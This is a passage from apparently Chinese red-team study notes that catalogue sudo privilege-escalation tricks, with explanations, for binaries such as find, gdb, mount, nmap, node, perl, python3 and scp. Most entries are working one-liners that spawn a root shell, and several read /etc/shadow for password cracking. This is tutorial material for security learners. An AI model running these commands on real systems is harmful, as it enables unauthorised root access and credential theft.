-ver</p></li><li><p>12.40</p></li><li><p>根据CVE-2021-22204 exiftool的12.05存在漏洞 一般认为7.44-12.23都有漏洞</p></li><li><p>vi payload</p></li></ul><h3 id="sudo-expect"><a href="#sudo-expect" class="headerlink" title="sudo expect"></a>sudo expect</h3><ul><li>sudo -l | grep expect</li></ul><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nix">(root) <span class="hljs-params">NOPASSWD:</span> <span class="hljs-symbol">/usr/bin/expect</span> <br></code></pre></td></tr></table></figure><ul><li><p>sudo expect -c ‘spawn &#x2F;bin&#x2F;bash;interact’</p></li><li><p>提权成功</p></li><li><p>expect能够模拟用户的键盘输入，因此可以自动化需要用户交互的过程</p></li><li><p>整个命令将以root用户身份在新的shell进程中开启一个交互是绘画，-c允许你直接在命令行中输入expect脚本代码，而不是从文件中读取。</p></li></ul><h3 id="sudo-fail2ban"><a href="#sudo-fail2ban" class="headerlink" title="sudo fail2ban"></a>sudo fail2ban</h3><ul><li>sudo -l | grep fail2ban</li></ul><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nix">(root) <span class="hljs-params">NOPASSWD:</span> <span class="hljs-symbol">/etc/init.d/fail2ban</span>      <br></code></pre></td></tr></table></figure><ul><li><p>查找fail2ban的配置文件</p></li><li><p>find &#x2F; -name “fail2ban*” -type d 2&gt;&#x2F;dev&#x2F;null</p></li></ul><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/doc/</span>fail2ban<br><span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/python3/</span>dist-packages/fail2ban-<span class="hljs-number">0.11</span>.<span class="hljs-number">2</span>.egg-info<br><span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/python3/</span>dist-packages/fail2ban<br><span class="hljs-regexp">/run/</span>fail2ban<br><span class="hljs-regexp">/var/</span>lib/fail2ban<br><span class="hljs-regexp">/etc/</span>fail2ban<br><span class="hljs-regexp">/etc/</span>fail2ban/fail2ban.d<br></code></pre></td></tr></table></figure><ul><li><p>find &#x2F;etc -writable -type d 2&gt;&#x2F;dev&#x2F;null</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/etc/fail2ban/action.d  <br></code></pre></td></tr></table></figure></li><li><p>cd到&#x2F;etc&#x2F;fail2ban</p></li><li><p>ls -la jail.conf</p></li></ul><h3 id="sudo-find"><a href="#sudo-find" class="headerlink" title="sudo find"></a>sudo find</h3><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elixir">jackie<span class="hljs-variable">@RedteamNotes</span><span class="hljs-symbol">:/etc/fail2ban</span><span class="hljs-variable">$ </span>sudo -l | grep find    <br>(root) <span class="hljs-symbol">NOPASSWD:</span> /usr/bin/find   <br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> find . -<span class="hljs-built_in">exec</span> /bin/bash \; -quit<br></code></pre></td></tr></table></figure><ul><li><p>提权成功</p></li><li><p>本质上不是查找逻辑 &#x2F;bin&#x2F;bash 不会对找到的文件或者目录进行任何处理，而-quit又会在找到第一个文件或者目录后就使find命令停止。全部的命令就是新起一个shell</p></li><li><p>;则是-exec参数的结束符，告诉find命令-exec参数的内容到此为止。需要注意的是，-exec命令后面的;必须被转义（加上\），否则shell会将;解释为命令分隔符。这会导致-exec参数没有正确的结束，从而引发错误。因此我们需要写成;而不是单独的;</p></li><li><p>; 在shell中，分号被用作命令连接符。它允许你在一行中输入多个命令，而这些命令将会依次执行，例如 command1；command2会首先执行command1，不论是否执行成功。- 在命令行选项中，连字符常常被用作引导一个或doge字母的短选项。</p></li><li><p>总结：表示在当前目录下查找文件，并不关心结果，每当find遍历到文件时，就会执行&#x2F;bin&#x2F;bash 而-quit的存在会让找到第一个文件后就退出</p></li></ul><h3 id="sudo-flock"><a href="#sudo-flock" class="headerlink" title="sudo flock"></a>sudo flock</h3><ul><li>sudo -l | grep flock</li></ul><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">(root) NOPASSWD: <span class="hljs-regexp">/usr/</span>bin/<span class="hljs-keyword">flock</span>        <br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> flock -u / /bin/bash <br></code></pre></td></tr></table></figure><ul><li><p>提权成功</p></li><li><p>flock是一个在linux中管理文件锁定的实用程序。他可以用来协调多个进程对文件或者文件系统的访问，避免这些进程同时访问同一资源导致的问题。</p></li><li><p>-u：这是一个flock的选项，表示解锁。</p></li><li><p>全部命令的含义就是以管理员权限来解锁对根目录的锁定，并以bash shell来执行这个操作</p></li><li><p>因为实际上根目录不需要解锁，所以结果就是启动了一个&#x2F;bin&#x2F;bash</p></li></ul><h3 id="sudo-ftp"><a href="#sudo-ftp" class="headerlink" title="sudo ftp"></a>sudo ftp</h3><ul><li><p>sudo -l | grep ftp</p></li><li><p>​    (root) NOPASSWD: &#x2F;usr&#x2F;bin&#x2F;ftp</p></li><li><p>sudo ftp</p></li></ul><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">!<span class="hljs-regexp">/bin/</span>bash<br></code></pre></td></tr></table></figure><ul><li>!在这里是一个特殊的字符，表示暂时离开ftp会话并在本地shell执行命令，这个用法在vi、ed等编辑器场景下也存在。</li></ul><h3 id="sudo-gcc"><a href="#sudo-gcc" class="headerlink" title="sudo gcc"></a>sudo gcc</h3><ul><li>sudo -l | grep gcc</li></ul><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">(root) NOPASSWD: <span class="hljs-regexp">/usr/</span>bin/gcc<br></code></pre></td></tr></table></figure><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">sudo gcc -<span class="hljs-keyword">wrapper</span> /bin/bash,-s .<br></code></pre></td></tr></table></figure><ul><li><p>提权成功</p></li><li><p>-wrapper 这是gcc的一个选项，它允许你在gcc调用实际编译器或者链接器之前，线调用一个包装器(wrapper)脚本或者程序。</p></li><li><p>,-s 是bash带的一个选项，它使得bash在读取到EOF时不会退出</p></li><li><p>.是编译的源码 但实际上不想编译任何东西，因此给啥都行</p></li><li><p>在这里，<code>/bin/bash</code> 是作为包装器程序运行的，而 <code>-s</code> 选项会启动一个新的 <code>bash</code> shell，并且不显示启动消息</p></li><li><p>也就是说 在gcc运行过程中，实际上启动了一个&#x2F;bin&#x2F;bash</p></li><li><p>-s是bash的参数 用于启动一个静默模式的bash shell 不显示启动信息</p></li></ul><h3 id="sudo-gdb"><a href="#sudo-gdb" class="headerlink" title="sudo gdb"></a>sudo gdb</h3><ul><li>sudo -l | grep gdb</li></ul><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">(root) NOPASSWD: <span class="hljs-regexp">/usr/</span>bin/gdb<br></code></pre></td></tr></table></figure><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">sudo gdb -nx -<span class="hljs-keyword">ex</span> <span class="hljs-string">&#x27;!bash&#x27;</span> -<span class="hljs-keyword">ex</span> <span class="hljs-keyword">quit</span><br></code></pre></td></tr></table></figure><ul><li><p>提权成功</p></li><li><p>gdb：GNU调试器，用于调试程序。gdb可以执行多种命令，甚至可以通过它执行操作系统命令</p></li><li><p>-nx：告诉gdb在启动时不要只想任何初始化脚本，这是为了确保调试环境干净，不受到本地脚本的干扰</p></li><li><p>-ex ‘!bash’：-ex选项允许在gdb启动时执行指定的命令。在这里，!bash是gdb的命令，它通过!运行一个操作系统命令，!bash就是通过gdb执行Bash shell</p></li><li><p>-ex quit：执行后立即退出gdb，确保gdb不继续保持运行状态，用户直接进入root的shell</p></li></ul><h3 id="sudo-git"><a href="#sudo-git" class="headerlink" title="sudo git"></a>sudo git</h3><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">sudo <span class="hljs-punctuation">-</span>l <span class="hljs-string">| grep git</span><br></code></pre></td></tr></table></figure><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nix">(root) <span class="hljs-params">NOPASSWD:</span> <span class="hljs-symbol">/usr/bin/git</span>      <br></code></pre></td></tr></table></figure><ul><li><p>sudo git branch –help</p></li><li><p>!&#x2F;bin&#x2F;bash</p></li><li><p>提权成功</p></li><li><p>branch是git的一个子命令，用于处理代码库中的分支，可以使用git branch创建、列出、删除分支。</p></li><li><p>git的使用有多种变体</p></li></ul><h3 id="sudo-gzip-gunzip"><a href="#sudo-gzip-gunzip" class="headerlink" title="sudo gzip&#x2F;gunzip"></a>sudo gzip&#x2F;gunzip</h3><ul><li>sudo -l | grep gzip</li></ul><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nix">(root) <span class="hljs-params">NOPASSWD:</span> <span class="hljs-symbol">/usr/bin/gzip</span>      <br></code></pre></td></tr></table></figure><ul><li><p>sudo gzip -f &#x2F;etc&#x2F;shadow -t</p></li><li><p>-f 表示强制</p></li><li><p>-t表示测试压缩文件的完整性</p></li></ul><h3 id="sudo-hping3"><a href="#sudo-hping3" class="headerlink" title="sudo hping3"></a>sudo hping3</h3><ul><li>sudo -l | grep hping3</li></ul><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nix">(root) <span class="hljs-params">NOPASSWD:</span> <span class="hljs-symbol">/usr/sbin/hping3</span> <br></code></pre></td></tr></table></figure><ul><li><p>sudo hping3</p></li><li><p>&#x2F;bin&#x2F;bash</p></li><li><p>提权成功</p></li></ul><h3 id="sudo-iftop"><a href="#sudo-iftop" class="headerlink" title="sudo iftop"></a>sudo iftop</h3><ul><li>sudo -l | grep iftop</li></ul><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nix">(root) <span class="hljs-params">NOPASSWD:</span> <span class="hljs-symbol">/usr/sbin/iftop</span>  <br></code></pre></td></tr></table></figure><ul><li><p>sudo ipftop</p></li><li><p>!进入交互</p></li><li><p>&#x2F;bin&#x2F;bash</p></li><li><p>提权成功</p></li></ul><h3 id="sudo-java"><a href="#sudo-java" class="headerlink" title="sudo java"></a>sudo java</h3><ul><li>sudo -l | grep java</li></ul><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nix">(root) <span class="hljs-params">NOPASSWD:</span> <span class="hljs-symbol">/usr/bin/java</span>   <br></code></pre></td></tr></table></figure><h3 id="sudo-knife"><a href="#sudo-knife" class="headerlink" title="sudo knife"></a>sudo knife</h3><ul><li>sudo -l | grep knife</li></ul><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nix">(root) <span class="hljs-params">NOPASSWD:</span> <span class="hljs-symbol">/usr/bin/knife</span> <br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> knife <span class="hljs-built_in">exec</span> -E <span class="hljs-string">&#x27;exec &quot;/bin/bash&quot;&#x27;</span><br></code></pre></td></tr></table></figure><ul><li><p>提权成功</p></li><li><p>knife是Chef的命令行接口。Chef是一个自动化管理和配置工具，可以用于管理服务器和基础设施。knife命令可以用于与Chef服务器进行交互、上传配方、登登。</p></li><li><p>exec是一个knife子命令，用于在节点上执行Ruby代码</p></li><li><p>-E后面接Ruby代码</p></li><li><p>‘exec “&#x2F;bin&#x2F;bash”‘执行一个bash shell</p></li></ul><h3 id="sudo-less"><a href="#sudo-less" class="headerlink" title="sudo less"></a>sudo less</h3><ul><li>sudo -l | grep less</li></ul><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nix">(root) <span class="hljs-params">NOPASSWD:</span> <span class="hljs-symbol">/usr/bin/less</span> <br></code></pre></td></tr></table></figure><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs elixir">jackie<span class="hljs-variable">@RedteamNotes</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>mktemp ./<span class="hljs-title class_">XXXXX</span>                                                                                              <br>./<span class="hljs-title class_">IS2CE</span>                                                                                                                            <br>jackie<span class="hljs-variable">@RedteamNotes</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>sudo less <span class="hljs-title class_">IS2CE</span>   <br></code></pre></td></tr></table></figure><ul><li><p>!&#x2F;bin&#x2F;bash</p></li><li><p>提权成功</p></li></ul><h3 id="sudo-man"><a href="#sudo-man" class="headerlink" title="sudo man"></a>sudo man</h3><ul><li>sudo -l | grep man</li></ul><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nix">(root) <span class="hljs-params">NOPASSWD:</span> <span class="hljs-symbol">/usr/bin/man</span>    <br></code></pre></td></tr></table></figure><ul><li><p>sudo man ls</p></li><li><p>!&#x2F;bin&#x2F;bash</p></li><li><p>提权成功</p></li><li><p>man是查看manual，即查看帮助手册。</p></li></ul><h3 id="sudo-more"><a href="#sudo-more" class="headerlink" title="sudo more"></a>sudo more</h3><ul><li>sudo -l | grep more</li></ul><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nix">(root) <span class="hljs-params">NOPASSWD:</span> <span class="hljs-symbol">/usr/bin/more</span>  <br></code></pre></td></tr></table></figure><ul><li><p>mktemp .&#x2F;XXXXX</p></li><li><p>提权方式和less基本相似 打开个文件 !&#x2F;bin&#x2F;bash即可</p></li></ul><h3 id="sudo-mount"><a href="#sudo-mount" class="headerlink" title="sudo mount"></a>sudo mount</h3><ul><li>sudo -l | grep mount</li></ul><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nix">(root) <span class="hljs-params">NOPASSWD:</span> <span class="hljs-symbol">/usr/bin/mount</span>  <br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> mount -o <span class="hljs-built_in">bind</span> /bin/bash /usr/bin/mount<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> /usr/bin/mount<br></code></pre></td></tr></table></figure><ul><li><p>提权成功</p></li><li><p>使用sudo权限进行挂载</p></li><li><p>mount：是一个用于挂载文件系统的命令</p></li><li><p>-o bind：表示绑定挂载，绑定挂载允许将一个目录或者文件挂载到另一个目录上，使得两者内容一致</p></li><li><p>&#x2F;bin&#x2F;bash：要挂载的原路径，表示把这个文件进行挂载</p></li><li><p>&#x2F;usr&#x2F;bin&#x2F;mount:要挂载到的目标路径，表示将&#x2F;bin&#x2F;bash文件挂载到&#x2F;usr&#x2F;bin&#x2F;mount这个路径上</p></li></ul><h3 id="sudo-mysql"><a href="#sudo-mysql" class="headerlink" title="sudo mysql"></a>sudo mysql</h3><ul><li>sudo -l | grep mysql</li></ul><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nix">(root) <span class="hljs-params">NOPASSWD:</span> <span class="hljs-symbol">/usr/bin/mysql</span> <br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> mysql -e <span class="hljs-string">&#x27;\! /bin/bash&#x27;</span><br></code></pre></td></tr></table></figure><ul><li><p>提权成功</p></li><li><p>-e 用于执行命令，不需要打开一个mysql交互式会话</p></li><li><p>\是转义符</p></li><li><p>当在mysql shell 中 加入 !,表示可以运行bash shell的命令</p></li></ul><h3 id="sudo-nano"><a href="#sudo-nano" class="headerlink" title="sudo nano"></a>sudo nano</h3><ul><li>sudo -l | grep nano</li></ul><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nix">(root) <span class="hljs-params">NOPASSWD:</span> <span class="hljs-symbol">/usr/bin/nano</span>    <br></code></pre></td></tr></table></figure><ul><li><p>ctrl + r</p></li><li><p>ctrl + x</p></li><li><p>reset; bash 1&gt;&amp;0 2&gt;&amp;0</p></li><li><p>成功提权</p></li></ul><h3 id="sudo-neofetch"><a href="#sudo-neofetch" class="headerlink" title="sudo neofetch"></a>sudo neofetch</h3><ul><li>sudo -l | grep neofetch</li></ul><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nix">(root) <span class="hljs-params">NOPASSWD:</span> <span class="hljs-symbol">/usr/bin/neofetch</span>    <br></code></pre></td></tr></table></figure><ul><li><p>TF&#x3D;$(mktemp)</p></li><li><p>echo ‘exec &#x2F;bin&#x2F;sh’ &gt;$TF</p></li><li><p>sudo neofetch –config $TF</p></li><li><p>提权成功</p></li><li><p>neofetch 是一个命令行程序，用于显示关于你的系统的信息，包括你的操作系统，软件版本，桌面环境，主题，硬件配置等。</p></li><li><p>–config:这是neofrtch的一个选项，允许你指定一个自定义的配置文件。</p></li></ul><h3 id="sudo-nice"><a href="#sudo-nice" class="headerlink" title="sudo nice"></a>sudo nice</h3><ul><li>sudo -l | grep nice</li></ul><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nix">(root) <span class="hljs-params">NOPASSWD:</span> <span class="hljs-symbol">/usr/bin/nice</span>  <br></code></pre></td></tr></table></figure><ul><li><p>sudo nice &#x2F;bin&#x2F;bash</p></li><li><p>提权成功</p></li><li><p>nice：这个命令用于修改进程的优先级。nice值得范围从-20（最高优先级别）到19（最低优先级别）。</p></li><li><p>该提权命令将以root的身份启动一个新的bash shell，并且他的优先级比其他默认近程更低（默认是10）</p></li></ul><h3 id="sudo-nmap"><a href="#sudo-nmap" class="headerlink" title="sudo nmap"></a>sudo nmap</h3><ul><li>sudo -l | grep nmap</li></ul><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nix">(root) <span class="hljs-params">NOPASSWD:</span> <span class="hljs-symbol">/usr/bin/nmap</span>  <br></code></pre></td></tr></table></figure><ul><li><p>Redteam&#x3D;$(mktemp)</p></li><li><p>echo ‘os.execute(“&#x2F;bin&#x2F;sh”)’ &gt; $Redteam</p></li><li><p>sudo nmap –script&#x3D;$Redteam</p></li><li><p>提权成功</p></li><li><p>不过shell的交互比较差，可以用python去提高交互性能</p></li><li><p>nmap的2.02到5.21版本，可以sudo nmap –interactive启动shell，然后用!bash拿到提权</p></li><li><p>nmap用法很多，<a href="https://gtfobins.github.io/gtfobins/nmap/">https://gtfobins.github.io/gtfobins/nmap/</a></p></li></ul><h3 id="sudo-node"><a href="#sudo-node" class="headerlink" title="sudo node"></a>sudo node</h3><ul><li>sudo -l | grep node</li></ul><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">(root) NOPASSWD: /usr/bin/<span class="hljs-keyword">node</span>      <span class="hljs-title"></span><br></code></pre></td></tr></table></figure><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">sudo <span class="hljs-keyword">node</span> <span class="hljs-title">-e</span> &#x27;require(<span class="hljs-string">&quot;child_process&quot;</span>).spawn(<span class="hljs-string">&quot;/bin/bash&quot;</span>,<br>&#123;stdio: [<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>]&#125;)&#x27;<br></code></pre></td></tr></table></figure><ul><li><p>提权成功</p></li><li><p>node命令用于运行node.js程序</p></li><li><p>-e选项允许直接在命令行中运行一段Node.js代码</p></li><li><p>require(“child_process”) 调用了Node.js的内置模块 child_process ，该模块提供了创建子进程的能力。</p></li><li><p>spawn方法是child_process模块中的一个函数，可以用来创建新的子进程。它的第一个参数是要运行的命令（在这里是&#x2F;bin&#x2F;bash，即新的bash shell）。</p></li><li><p>stdio字段指定了子进程的输入&#x2F;输出应该如何处理。[0,1,2]意味着子进程的stdin、stdout和stderr应该连接到父进程相应的流。</p></li></ul><h3 id="sudo-nohup"><a href="#sudo-nohup" class="headerlink" title="sudo nohup"></a>sudo nohup</h3><ul><li>sudo -l | grep nohub</li></ul><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nix">(root) <span class="hljs-params">NOPASSWD:</span> <span class="hljs-symbol">/usr/bin/nohup</span>  <br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> <span class="hljs-built_in">nohup</span> /bin/bash -c <span class="hljs-string">&quot;bash &lt;<span class="hljs-subst">$(tty)</span> &gt;<span class="hljs-subst">$(tty)</span> 2&gt;<span class="hljs-subst">$(tty)</span>&quot;</span><br></code></pre></td></tr></table></figure><ul><li><p>提权成功</p></li><li><p>交互性不好</p></li><li><p>但是用python3 -c “import pty;pty.spawn(‘&#x2F;bin&#x2F;bash’)”可以提升交互</p></li><li><p>nohup：这个命令的用途是运行一个命令，同时忽略所有挂起信号。如果你用nohup启动一个进程，那么即使终端关闭，该进程也会继续运行。</p></li><li><p>&#x2F;bin&#x2F;bash -c:这是运行一个bash shell，并且执行-c后的命令</p></li><li><p>“bash &lt;$(tty) &gt;$(tty) 2&gt;$(tty)”：这里bash打开一个新的shell，把新的shell的输入、输出、错误都重定向到当前设备</p></li></ul><h3 id="sudo-openvpn"><a href="#sudo-openvpn" class="headerlink" title="sudo openvpn"></a>sudo openvpn</h3><ul><li>sudo -l | grep openvpn</li></ul><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nix">(root) <span class="hljs-params">NOPASSWD:</span> <span class="hljs-symbol">/usr/sbin/openvpn</span> <br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> openvpn --config /etc/shadow<br></code></pre></td></tr></table></figure><ul><li><p>放到kali用john破解即可</p></li><li><p>将想要读的文件指定为openvpn的配置文件，通过报错获取敏感信息，其实flag也能读到，思路要拓宽。</p></li></ul><h3 id="sudo-passwd"><a href="#sudo-passwd" class="headerlink" title="sudo passwd"></a>sudo passwd</h3><ul><li>sudo -l | grep passwd</li></ul><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nix">(root) <span class="hljs-params">NOPASSWD:</span> <span class="hljs-symbol">/usr/bin/passwd</span>         <br></code></pre></td></tr></table></figure><ul><li><p>sudo passwd root</p></li><li><p>直接更改提权</p></li></ul><h3 id="sudo-perl"><a href="#sudo-perl" class="headerlink" title="sudo perl"></a>sudo perl</h3><ul><li>sudo -l | gep perl</li></ul><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nix">(root) <span class="hljs-params">NOPASSWD:</span> <span class="hljs-symbol">/usr/bin/perl</span>     <br></code></pre></td></tr></table></figure><ul><li><p>sudo perl -e ‘exec “&#x2F;bin&#x2F;bash”;’</p></li><li><p>提权成功</p></li><li><p>-e：是perl的命令行选项，允许在shell中直接执行perl脚本</p></li><li><p>exec函数用于启动一个子进程执行指定的程序</p></li></ul><h3 id="sudo-php"><a href="#sudo-php" class="headerlink" title="sudo php"></a>sudo php</h3><ul><li>sudo -l | grep php</li></ul><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nix">(root) <span class="hljs-params">NOPASSWD:</span> <span class="hljs-symbol">/usr/bin/php</span>      <br></code></pre></td></tr></table></figure><ul><li><p>sudo php -r “system(‘&#x2F;bin&#x2F;bash’);”</p></li><li><p>同上</p></li><li><p>有很多变体，别的函数</p></li></ul><h3 id="sudo-pico"><a href="#sudo-pico" class="headerlink" title="sudo pico"></a>sudo pico</h3><ul><li><p>sudo -l | grep pico</p></li><li><p>sudo pico</p></li><li><p>ctrl + r</p></li><li><p>ctrl + x</p></li><li><p>reset; bash 1&gt;&amp;0 2&gt;&amp;0</p></li><li><p>成功提权</p></li></ul><h3 id="sudo-pkexec"><a href="#sudo-pkexec" class="headerlink" title="sudo pkexec"></a>sudo pkexec</h3><ul><li>sudo -l | grep pkecec</li></ul><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nix">(root) <span class="hljs-params">NOPASSWD:</span> <span class="hljs-symbol">/usr/bin/pkexec</span>       <br></code></pre></td></tr></table></figure><ul><li><p>sudo pkexec &#x2F;bin&#x2F;bash</p></li><li><p>成功提权</p></li><li><p>pkecex：这是PolicyKit的一部分，PolicyKit是一种服务，用于管理系统范围内的策略，并允许非特权进程通信以进行特权操作。pkexec允许一个授权用户执行程序（我们用它来启动&#x2F;bin&#x2F;bash）作为另一个用户，并且可以在没有密码提示的情况下运行。</p></li></ul><h3 id="sudo-python3"><a href="#sudo-python3" class="headerlink" title="sudo python3"></a>sudo python3</h3><ul><li>sudo -l | grep python3</li></ul><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nix">(root) <span class="hljs-params">NOPASSWD:</span> <span class="hljs-symbol">/usr/bin/python3</span>    <br></code></pre></td></tr></table></figure><ul><li><p>sudo python3 -c ‘import os; os.system(“&#x2F;bin&#x2F;bash”)’</p></li><li><p>提权成功</p></li><li><p>用提升交互性的那段代码也能够用来提权</p></li></ul><h3 id="sudo-rvim"><a href="#sudo-rvim" class="headerlink" title="sudo rvim"></a>sudo rvim</h3><ul><li>sudo -l |grep rvim</li></ul><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nix">(root) <span class="hljs-params">NOPASSWD:</span> <span class="hljs-symbol">/usr/bin/rvim</span>  <br></code></pre></td></tr></table></figure><figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pf">sudo rvim -c &#x27;:python import <span class="hljs-keyword">os</span>; <span class="hljs-keyword">os</span>.execl(<span class="hljs-string">&quot;/bin/bash&quot;</span>,<br><span class="hljs-string">&quot;bash&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, <span class="hljs-string">&quot;reset; exec bash&quot;</span>)&#x27;<br></code></pre></td></tr></table></figure><ul><li><p>提权成功</p></li><li><p>rvim：这是vim编辑器的一个特殊版本，其中的r代表restricted（限制的），相比普通的vim，它限制了shell命令或脚本的使用</p></li><li><p>-c：让vim启动后执行指定的Ex命令或者Vim脚本</p></li></ul><h3 id="sudo-scp"><a href="#sudo-scp" class="headerlink" title="sudo scp"></a>sudo scp</h3><ul><li>sudo -l | grep scp</li></ul><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nix">(root) <span class="hljs-params">NOPASSWD:</span> <span class="hljs-symbol">/usr/bin/scp</span>     <br></code></pre></td></tr></table></figure><ul><li><p>TF&#x3D;$(mktemp)</p></li><li><p>echo ‘bash 0&lt;&amp;2 1&lt;&amp;2’ &gt; $TF</p></li><li><p>chmod +x “$TF”</p></li><li><p>sudo scp -S $TF x y:</p></li><li><p>提权成功</p></li><li><p>-S参数需要一个程序或者脚本文件的路径，所以直接把代码给过去是不行的</p></li><li><p>-S $TF 这部分指定了ssh的程序</p></li><li><p>x和y：这部分是scp命令的参数，表示源文件x，目标位置y。</p></li><li><p>以超级用户的身份，使用$TF路径下的脚本作为ssh程序，将文件x复制到位置y</p></li></ul><h3 id="sudo-screen"><a href="#sudo-screen" class="headerlink" title="sudo screen"></a>sudo screen</h3><ul><li>sudo -l | grep screen</li></ul><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nix">(root) <span class="hljs-params">NOPASSWD:</span> <span class="hljs-symbol">/usr/bin/screen</span> 